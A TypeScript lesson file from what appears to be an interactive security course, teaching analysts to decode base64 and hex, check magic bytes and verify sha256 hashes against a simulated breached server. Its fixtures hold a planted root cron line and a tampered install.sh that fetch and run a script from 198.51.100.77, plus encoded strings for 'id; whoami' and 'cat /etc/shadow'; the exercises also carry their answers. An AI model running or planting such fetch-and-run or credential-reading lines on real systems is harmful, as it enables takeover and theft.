import { defineFixture } from '../fixtures';
import { home, put } from '../fixtures/base';
import type { Mission } from '../types';

// Evidence from web01 after the breach. Every "binary" is a few ASCII bytes plus the words "training sample".
// sha256 values (checked with sha256sum): invoice.pdf 5d53a474…4353, report.pdf 0fb4412c…45d4,
// update.sh 9b97295b…6c4b, notes.txt 9a94bf42…a9fc, tool-1.4.tar.gz a34e1dd3…981e, original install.sh 498a0dfe…557c.
const INVOICE = 'MZ\x00\x00\x03\x00\x00\x00PE\x00\x00L\x01 invoice viewer (training sample, not a real program)\n';
const REPORT = '%PDF-1.7\n% Halden quarterly report (training sample)\n1 0 obj << /Type /Catalog >> endobj\n%%EOF\n';
const UPDATE = '#!/bin/bash\n# vendor update helper (training sample)\necho "checking for updates..."\n';
const NOTES = 'Meeting notes: rotate the VPN certificates before Friday.\n';
const INVOICE_SHA = '5d53a4746cca2a9cdce77482011d0de2696153da72c36cf93ce50f63b3664353';

/** The planted cron job. The blob decodes to: curl -s http://198.51.100.77/u.sh | bash */
const SYSUPDATE = '# system update check\n*/15 * * * * root echo Y3VybCAtcyBodHRwOi8vMTk4LjUxLjEwMC43Ny91LnNoIHwgYmFzaAo= | base64 -d | bash\n';

/** Strings pulled from web01's web log: base64 (id; whoami), hex (cat /etc/shadow), base64, base64 twice. */
const STRINGS = [
  'cmd1: aWQ7IHdob2FtaQ==',
  'cmd2: 636174202f6574632f736861646f77',
  'note: SGFsZGVuIFNlY3VyaXR5IC0gaW50ZXJuYWwgb25seQ==',
  'double: WTJodGIyUWdLM2dnTDNSdGNDOHVlQzkxY0dSaGRHVXVjMmdLCg==',
].join('\n') + '\n';

/** The vendor's install.sh hashes to 498a0dfe…557c. The copy on web01 has one extra line. */
const INSTALL_TAMPERED = '#!/bin/bash\n# install.sh - installs tool 1.4\nset -euo pipefail\ncp tool /usr/local/bin/tool\ncurl -s http://198.51.100.77/i.sh | bash\necho "installed"\n';
const SHA256SUMS = 'a34e1dd3599655f20aa831fb759bcc20b827f0bb125e684e0e1cdcfaf63c981e  tool-1.4.tar.gz\n498a0dfe0b5428cbf8646dedccdb62d80a1b9bf25f153fa358d13d2cd74d557c  install.sh\n';

defineFixture('day16', (vfs) => {
  const planted = Date.UTC(2026, 2, 14, 0, 31, 4);
  const pulled = Date.UTC(2026, 2, 14, 9, 40, 0);
  put(vfs, '/etc/cron.d/sysupdate', SYSUPDATE, { mode: 0o644, mtime: planted });
  put(vfs, '/etc/cron.d/halden-backup', '# Halden IT: nightly config backup\n45 1 * * * backup /opt/halden/cfg-backup --quiet\n', { mode: 0o644, mtime: Date.UTC(2026, 0, 20, 10, 0, 0) });
  home(vfs, 'evidence/strings.txt', STRINGS, 0o644, pulled);
  home(vfs, 'evidence/downloads/invoice.pdf', INVOICE, 0o644, Date.UTC(2026, 2, 13, 23, 54, 12));
  home(vfs, 'evidence/downloads/report.pdf', REPORT, 0o644, Date.UTC(2026, 2, 12, 15, 2, 40));
  home(vfs, 'evidence/downloads/update.sh', UPDATE, 0o644, Date.UTC(2026, 2, 10, 11, 20, 5));
  home(vfs, 'evidence/downloads/notes.txt', NOTES, 0o644, Date.UTC(2026, 2, 11, 9, 15, 0));
  home(vfs, 'evidence/known_bad.txt', ['0b1731dbf3b7ad02c8c1b50eb5e8172df835c2218c5a2085de429032de7f482f', INVOICE_SHA, '0eda9ed046315e5fd09f141072b51a4a78166ed3214fdea7143c40b731ffdeba'].join('\n') + '\n', 0o644, pulled);
  home(vfs, 'evidence/release/tool-1.4.tar.gz', 'tool-1.4 release archive (training sample)\n', 0o644, Date.UTC(2026, 2, 2, 8, 0, 0));
  home(vfs, 'evidence/release/SHA256SUMS', SHA256SUMS, 0o644, Date.UTC(2026, 2, 2, 8, 0, 0));
  home(vfs, 'evidence/release/install.sh', INSTALL_TAMPERED, 0o755, Date.UTC(2026, 2, 14, 0, 33, 51));
});

export const day16: Mission = {
  day: 16,
  week: 3,
  title: 'Hidden in Plain Sight',
  topic: 'Encoding, hashing & decoding payloads',
  minutes: 45,
  fixture: 'day16',
  caseId: 'decoder',
  briefing: `Overnight, the clean-up on web01 turned up something nobody at Halden wrote: a cron job that runs every fifteen minutes **as root**, built around a line of gibberish — \`Y3VybCAtcyBodHRwOi8v…\`. The web log is full of the same kind of noise.

That gibberish isn’t encrypted. It’s **encoded**, and anyone can turn it back into text. The attacker used it so that a quick glance, or a \`grep curl\`, would slide straight past. Today you learn to read it — base64 and hex — and to judge files by their first bytes instead of their names.

Then **hashes**: one-way fingerprints that tell you whether a file is known-bad, and whether someone has changed one. One rule holds all day: **decode to read. Never pipe what you decode into \`bash\`.**`,
  objectives: [
    'Tell encoding, hashing and encryption apart',
    'Decode base64 and hex — and read, never run, what comes out',
    'Unmask disguised files by their magic bytes',
    'Fingerprint files with sha256sum, match threat intel and catch tampering',
  ],
  lesson: [
    {
      kind: 'read',
      id: 'three',
      title: 'Three different things',
      md: `Three words get mixed up all the time. An analyst keeps them apart:

| | Reversible? | Key? | What it’s for |
|---|---|---|---|
| **Encoding** (base64, hex) | yes, by anyone | no | carrying bytes through text-only places: URLs, emails, config lines |
| **Hashing** (md5, sha256) | no, one way | no | a fingerprint: same bytes, same hash |
| **Encryption** (AES, GPG) | yes | **yes** | secrecy: unreadable without the key |

Encoding hides nothing from anyone who thinks to decode it. Attackers use it anyway, for a simple reason: a cron line full of \`Y3VybCAt…\` doesn’t contain the word \`curl\`. A quick \`grep curl\` misses it, and a tired admin skims straight past.`,
    },
    {
      kind: 'quiz',
      id: 'q-three',
      q: 'The planted cron line contains `Y3VybCAtcyBodHRwOi8v…YmFzaAo=`. What is it, and what do you need to read it?',
      options: ['Encryption: you need the attacker’s key', 'Encoding: anyone can reverse it, no key needed', 'A sha256 hash: it can only be compared, never reversed', 'Random noise added to confuse analysts'],
      answer: 1,
      explain: 'Letters, digits and a trailing `=` are base64’s calling card. The cron line itself turns it back into a command with `base64 -d` — no key anywhere. A sha256 hash would be exactly 64 hex characters.',
    },
    {
      kind: 'read',
      id: 'b64',
      title: 'base64',
      md: `**base64** writes any bytes using 64 safe characters (\`A-Z a-z 0-9 + /\`), plus \`=\` as padding at the end. Every 3 bytes become 4 characters.

\`\`\`bash
echo -n id | base64      # aWQ=
echo aWQ= | base64 -d    # id      (-d = decode)
\`\`\`

Watch the newline. \`echo\` adds one at the end, and base64 encodes it like any other byte. \`echo -n\` leaves it off (so does \`printf '%s'\`). When you encode, you almost always want \`-n\`, or your result won’t match anyone else’s.`,
    },
    {
      kind: 'predict',
      id: 'p-abc',
      md: 'Three bytes in. What comes out?',
      code: 'echo -n abc | base64',
      options: ['YWJj', 'YWJjCg==', 'abc', '616263'],
      answer: 0,
      explain: 'Three bytes make exactly four characters, so no padding. Without `-n` you’d get `YWJjCg==`: the `Cg==` is the encoded newline. (`616263` is the same three bytes in hex — more on that soon.)',
    },
    {
      kind: 'task',
      id: 'enc',
      md: 'Encode the username `analyst` in base64, **without** a trailing newline.',
      check: { output: 'YW5hbHlzdA==\n', uses: ['base64'] },
      solution: 'echo -n analyst | base64',
      hints: ['Pipe the word into `base64`.', '`echo -n` leaves off the newline: `echo -n analyst | base64`'],
      explain: 'Seven bytes isn’t a multiple of three, so base64 pads the end with `==`. Trailing `=` signs are one of the quickest ways to spot base64 in a log.',
    },
    {
      kind: 'task',
      id: 'dec',
      md: 'The team copied some odd strings out of web01’s logs into `~/evidence/strings.txt`. Look at the file, then decode the `cmd1` value.',
      check: { output: 'id; whoami\n', uses: ['base64'] },
      solution: "grep cmd1 ~/evidence/strings.txt | cut -d' ' -f2 | base64 -d",
      hints: ['`cat ~/evidence/strings.txt` first. The value is the second space-separated field.', "Pull it out with `grep cmd1 FILE | cut -d' ' -f2` (or copy it by hand), then pipe it into `base64 -d`.", "`grep cmd1 ~/evidence/strings.txt | cut -d' ' -f2 | base64 -d`"],
      explain: '`id; whoami`: the first two commands almost every intruder types on a new machine. *Who am I here, and what can I touch?*',
    },
    {
      kind: 'read',
      id: 'cron',
      title: 'Reading the planted job',
      md: `**cron** runs commands on a schedule. A line in \`/etc/cron.d/\` reads:

| Field | In our line | Means |
|---|---|---|
| minute | \`*/15\` | every 15 minutes |
| hour, day, month, weekday | \`* * * *\` | every one of them |
| user | \`root\` | run as root |
| the rest | \`echo … \\| base64 -d \\| bash\` | the command |

To search **every file in a folder**, give grep \`-r\` (recursive). Each hit starts with its file name.

To pull a base64 blob out of a line, describe its shape — 20 or more base64 characters, then up to two \`=\`:

\`\`\`bash
grep -Eo '[A-Za-z0-9+/]{20,}={0,2}' FILE
\`\`\`

The \`{20,}\` stops ordinary short words from matching.`,
    },
    {
      kind: 'task',
      id: 'find-cron',
      md: 'Something in `/etc/cron.d` decodes base64. Search **every file** in that folder for the word `base64`.',
      check: { output: 'reference', uses: ['grep'] },
      solution: 'grep -r base64 /etc/cron.d',
      hints: ['`-r` makes grep search a whole folder.', '`grep -r base64 /etc/cron.d`'],
      explain: 'One hit, in a file called `sysupdate`: a name picked to look boring. (Yesterday’s list spelled it `.sysupdate`. A leading dot would hide it from plain `ls`, but cron ignores any file in `/etc/cron.d` with a dot in its name, so a job that has to run can’t hide that way.) Read it left to right: every 15 minutes, as **root**, decode a blob and pipe it straight into `bash`. Resetting Raj’s password didn’t touch this. It runs whether anyone logs in or not.',
    },
    {
      kind: 'task',
      id: 'decode-cron',
      md: 'Extract the blob from `/etc/cron.d/sysupdate` with the base64-shaped regex, and decode it. Read it — **don’t** add `| bash`.',
      check: { output: 'curl -s http://198.51.100.77/u.sh | bash\n', uses: ['grep', 'base64'] },
      solution: "grep -Eo '[A-Za-z0-9+/]{20,}={0,2}' /etc/cron.d/sysupdate | base64 -d",
      hints: ["`grep -Eo '[A-Za-z0-9+/]{20,}={0,2}' /etc/cron.d/sysupdate` prints just the blob.", 'Pipe that into `base64 -d`.'],
      explain: 'Every 15 minutes, as root, the server downloaded `u.sh` from **198.51.100.77** and ran it, whatever it said that day. You’ve met that address: it’s the mail server that sent Mara the phishing email. Two incidents, one actor. The IP goes on the blocklist, and the cron file is evidence — copy it before anyone deletes it.',
    },
    {
      kind: 'quiz',
      id: 'q-safe',
      q: 'You need to know what a blob in a cron line says. Which command is safe to run?',
      options: ['`echo BLOB | base64 -d`', '`echo BLOB | base64 -d | bash`', '`echo BLOB | base64 -d > x.sh; bash x.sh`', '`bash -c "$(echo BLOB | base64 -d)"`'],
      answer: 0,
      explain: 'Only the first one stops at reading. The other three all **run** the decoded text — and this one downloads and runs a second script nobody has seen. Decode to read; never pipe to bash.',
    },
    {
      kind: 'read',
      id: 'hex',
      title: 'Hex and magic bytes',
      md: `**Hex** writes each byte as two characters from \`0-9 a-f\`: \`i\` is \`69\` and \`d\` is \`64\`, so \`id\` is \`6964\`. The hex tool is \`xxd\`:

\`\`\`bash
echo -n id | xxd         # 00000000: 6964    id
echo -n id | xxd -p      # 6964    (plain hex)
echo 6964 | xxd -r -p    # id      (-r: hex back to bytes)
\`\`\`

Hex also shows bytes you can’t type. Every file format starts with a signature, its **magic bytes**:

| First bytes | Hex | It’s really |
|---|---|---|
| \`%PDF\` | \`25 50 44 46\` | a PDF |
| \`MZ\` | \`4d 5a\` | a Windows program |
| \`.ELF\` | \`7f 45 4c 46\` | a Linux program |
| \`PK\` | \`50 4b 03 04\` | a zip (and .docx) |

A filename is a label anyone can change; programs read the bytes. \`head -c 4 FILE\` gives you the first 4 bytes, and \`file FILE\` does the whole lookup for you.`,
    },
    {
      kind: 'task',
      id: 'hex-dec',
      md: '`cmd2` in `~/evidence/strings.txt` isn’t base64: it’s nothing but `0-9` and `a-f`. Decode it from hex.',
      check: { output: 'cat /etc/shadow\n', uses: ['xxd'] },
      solution: "grep cmd2 ~/evidence/strings.txt | cut -d' ' -f2 | xxd -r -p",
      hints: ['Extract it the same way as `cmd1`.', "Decode with `xxd -r -p`: `grep cmd2 ~/evidence/strings.txt | cut -d' ' -f2 | xxd -r -p`"],
      explain: '`cat /etc/shadow`: a grab for the password hashes, which ordinary accounts can’t read. A long run of hex is easy to dismiss as an ID or a checksum; one `xxd -r -p` tells you which it is.',
    },
    {
      kind: 'task',
      id: 'magic',
      md: 'Someone on web01 downloaded an “invoice”. Go into `~/evidence/downloads` and show the **first 4 bytes** of `invoice.pdf` in hex.',
      // the full dump (`xxd`, `xxd -u`, `xxd -c 4`) or plain hex (`xxd -p`), but only the first 4 bytes
      check: { output: { regex: '^(00000000: )?4d ?5a ?00 ?00( +MZ\\.\\.)?$', flags: 'i' }, uses: ['head', 'xxd'], cwd: '~/evidence/downloads' },
      solution: 'cd ~/evidence/downloads && head -c 4 invoice.pdf | xxd',
      hints: ['`head -c 4` keeps the first 4 bytes (`-c` counts bytes, not lines).', '`cd ~/evidence/downloads`, then `head -c 4 invoice.pdf | xxd`'],
      explain: '`4d5a`: **MZ**, the start of a Windows program. A real PDF begins `2550 4446`. In the full `xxd` view, the dots on the right are bytes with no printable character. Now run `file *` to see every download’s true type at once: `report.pdf` really is a PDF, while `invoice.pdf` is a program in a PDF’s name.',
    },
    {
      kind: 'read',
      id: 'hash',
      title: 'Hashes: fingerprints for files',
      md: `A **hash** is a fixed-length fingerprint of a file’s bytes. The same bytes give the same hash on any machine. Change one byte and the hash changes completely:

\`\`\`bash
echo -n Halden | sha256sum   # 1f7e6884…dd0f  -
echo -n halden | sha256sum   # a08de976…165b  -
\`\`\`

One capital letter, nothing in common. You can’t turn a hash back into the file, but you can **match** it.

| Tool | Length | Note |
|---|---|---|
| \`md5sum\` | 32 hex | old and forgeable; still in older feeds |
| \`sha256sum\` | 64 hex | today’s standard |

Threat-intel feeds share hashes of known-bad files. To check yours against a list, use \`grep -F -f LIST\`: \`-f\` reads the patterns from a file, one per line, and \`-F\` treats them as plain text instead of regexes.`,
    },
    {
      kind: 'task',
      id: 'known-bad',
      md: '`~/evidence/known_bad.txt` is a threat-intel list of sha256 hashes. Still in `~/evidence/downloads`, hash every file and keep only the lines that match the list.',
      check: { output: 'reference', uses: ['sha256sum', 'grep'] },
      solution: 'cd ~/evidence/downloads && sha256sum * | grep -Ff ~/evidence/known_bad.txt',
      hints: ['Run `sha256sum *` on its own first and look at the output.', 'Then press ↑ and add `| grep -Ff ~/evidence/known_bad.txt`.'],
      explain: 'One match: `invoice.pdf`. You didn’t open it, run it or even work out what it does — someone else already analysed this exact file, and the hash told you so. Rename it and the hash stays the same; change a single byte and it slips past the list. Hash lists catch copies, not variants.',
    },
    {
      kind: 'task',
      id: 'verify',
      md: `Vendors publish a \`SHA256SUMS\` file beside each release, so you can prove a download is byte-for-byte what they shipped. \`sha256sum -c LIST\` re-hashes every file named in the list and prints \`OK\` or \`FAILED\`.

The names in the list are relative, so go into \`~/evidence/release\` (the tool-1.4 release, copied from web01) and check it.`,
      check: { output: 'reference', status: 1, uses: ['sha256sum'] },
      solution: 'cd ~/evidence/release && sha256sum -c SHA256SUMS',
      hints: ['`cd ~/evidence/release` first.', '`sha256sum -c SHA256SUMS`'],
      explain: '`install.sh: FAILED`, a warning on stderr and exit status 1: someone changed the installer after the vendor published it. `grep -n curl install.sh` shows their edit — one added line that pulls a script from 198.51.100.77 again. That single line changed every character of the hash. In a nightly cron job, `sha256sum -c --quiet` prints only the failures, and its exit status can raise the alert.',
    },
  ],
  drills: [
    {
      kind: 'task',
      id: 'd-note',
      md: '**Drill 1.** Decode the `note` value in `~/evidence/strings.txt`.',
      check: { output: 'Halden Security - internal only\n', uses: ['base64'] },
      solution: "grep '^note' ~/evidence/strings.txt | cut -d' ' -f2 | base64 -d",
      hints: ['Same shape as `cmd1`.', "`grep '^note' ~/evidence/strings.txt | cut -d' ' -f2 | base64 -d`"],
      explain: 'Encoded isn’t the same as malicious: that’s the footer of Halden’s own intranet pages. It still goes in the report, because it shows the attacker was reading internal pages from web01. Decode first, judge second.',
    },
    {
      kind: 'task',
      id: 'd-double',
      md: '**Drill 2.** The `double` value was base64-encoded **twice**. Decode both layers.',
      check: { output: 'chmod +x /tmp/.x/update.sh\n', uses: ['base64'] },
      solution: "grep '^double' ~/evidence/strings.txt | cut -d' ' -f2 | base64 -d | base64 -d",
      hints: ['Decode once and look: the result is base64 again.', 'Add a second `| base64 -d`.'],
      explain: '`/tmp/.x/` is the hidden folder from yesterday’s list of suspicious paths: the attacker made a dropped script executable. Layers slow a human down. They don’t slow down `| base64 -d | base64 -d`.',
    },
    {
      kind: 'task',
      id: 'd-md5',
      md: '**Drill 3.** The phishing email ended with `build 5d41402abc4b2a76b9719d911017c592`: 32 hex characters, so probably MD5. Mara thinks it’s the MD5 of the word `hello`, a placeholder the phishing kit never replaced. Check her claim in one line: hash `hello` with `md5sum`, once with `echo` and once with `echo -n`.',
      check: { output: 'reference', anyOrder: true, uses: ['md5sum'] },
      solution: 'echo hello | md5sum; echo -n hello | md5sum',
      hints: ['Two commands on one line, joined with `;`.', '`echo hello | md5sum; echo -n hello | md5sum`'],
      explain: 'Only the `-n` version matches. A single newline byte gave a completely different hash, and that’s the most common reason a hash check fails “for no reason”. The `-` at the end of each line means the input came from a pipe rather than a file.',
    },
    {
      kind: 'task',
      id: 'd-safe',
      md: `**Drill 4.** Not everything after \`cmd=\` in a log is clean base64. In \`Y2F0IC9ldGMvaG9zdHM%3D\`, the final \`=\` arrived URL-encoded as \`%3D\`, and \`base64 -d\` can print part of a value before it fails. So trust the exit status, not the text. An assignment like \`out=$(cmd)\` takes on cmd’s exit status, so \`if out=$(…); then\` tests and captures in one go.

Set \`p='Y2F0IC9ldGMvaG9zdHM%3D'\`. Then print \`decoded: TEXT\` if \`base64 -d\` succeeds, or \`not base64\` if it fails — with no error message on screen.`,
      check: { output: 'not base64\n', nodes: ['if', 'cmdsub', 'redirect'], uses: ['base64'] },
      solution: "p='Y2F0IC9ldGMvaG9zdHM%3D'; if out=$(printf '%s' \"$p\" | base64 -d 2>/dev/null); then echo \"decoded: $out\"; else echo 'not base64'; fi",
      hints: ['`2>/dev/null` throws the error message away.', "Feed the value in with `printf '%s' \"$p\"`: it prints it exactly, with no newline.", "`if out=$(printf '%s' \"$p\" | base64 -d 2>/dev/null); then echo \"decoded: $out\"; else echo 'not base64'; fi`"],
      explain: '`base64 -d` decoded `cat /etc/hosts`, hit the `%` and failed with status 1. Test whether `$out` is empty instead, and that half-decoded text lands in your report as if it were the whole payload. The web01 log also has `..%2f..%2fetc%2fpasswd`: a URL-encoded `../`, someone climbing out of the web folder, not a command. Check the status before you print anything: this one line is the heart of Case 4.',
    },
  ],
  debrief: {
    summary: [
      'Encoding (base64, hex) is reversible by anyone; hashing is a one-way fingerprint; encryption needs a key. Base64 hides from eyes, not from analysts.',
      '`echo -n TEXT | base64` encodes and `base64 -d` decodes; `xxd -p` and `xxd -r -p` do the same for hex. Decode to read — never pipe it into `bash`.',
      "`grep -r WORD DIR` searches a whole folder; `grep -Eo '[A-Za-z0-9+/]{20,}={0,2}'` pulls out base64 blobs.",
      'Magic bytes beat extensions: `head -c 4 FILE | xxd`, or `file FILE`.',
      '`sha256sum` fingerprints files, `grep -Ff known_bad.txt` matches them against intel, and `sha256sum -c SHA256SUMS` catches tampering. Case 4 is open: the Log Decoder.',
    ],
    cards: ['c-d16-three', 'c-d16-base64', 'c-d16-blob', 'c-d16-grepr', 'c-d16-xxd', 'c-d16-magic', 'c-d16-sha256', 'c-d16-knownbad', 'c-d16-verify', 'c-d16-ifassign'],
  },
  cards: [
    { id: 'c-d16-three', day: 16, tag: 'security', front: 'Encoding vs hashing vs encryption?', back: 'Encoding: reversible by anyone (base64, hex). Hashing: a one-way fingerprint (sha256). Encryption: reversible only with the key.' },
    { id: 'c-d16-base64', day: 16, tag: 'encoding', front: 'Base64-encode a word, then decode a blob — safely?', back: '`echo -n word | base64` (`-n`: no newline) and `echo BLOB | base64 -d`. Read the output; never add `| bash`.' },
    { id: 'c-d16-blob', day: 16, tag: 'regex', front: 'A regex that pulls base64 blobs out of a line?', back: "`grep -Eo '[A-Za-z0-9+/]{20,}={0,2}' FILE`" },
    { id: 'c-d16-grepr', day: 16, tag: 'grep', front: 'Search every file in a folder for a word?', back: '`grep -r base64 /etc/cron.d` — each hit starts with its file name.' },
    { id: 'c-d16-xxd', day: 16, tag: 'encoding', front: 'Hex dump / plain hex / hex back to text?', back: '`xxd FILE` / `xxd -p` / `xxd -r -p`' },
    { id: 'c-d16-magic', day: 16, tag: 'security', front: 'What is a file really, whatever its name says?', back: '`head -c 4 FILE | xxd` for the magic bytes (`MZ` Windows program, `%PDF` PDF, `.ELF` Linux program), or just `file FILE`.' },
    { id: 'c-d16-sha256', day: 16, tag: 'hashing', front: 'Fingerprint every file in a folder?', back: '`sha256sum *` — 64 hex characters each. Change one byte and the whole hash changes.' },
    { id: 'c-d16-knownbad', day: 16, tag: 'hashing', front: 'Check your files’ hashes against a threat-intel list?', back: '`sha256sum * | grep -Ff known_bad.txt` — `-f` reads patterns from a file, `-F` takes them literally.' },
    { id: 'c-d16-verify', day: 16, tag: 'hashing', front: 'Verify a release against the vendor’s SHA256SUMS?', back: '`sha256sum -c SHA256SUMS`, run inside the folder. `FAILED` and exit status 1 mean a file changed.' },
    { id: 'c-d16-ifassign', day: 16, tag: 'scripting', front: 'Decode a value only if it really is base64, with no error on screen?', back: '`if out=$(printf \'%s\' "$v" | base64 -d 2>/dev/null); then echo "$out"; fi` — the assignment carries base64’s exit status.' },
  ],
};
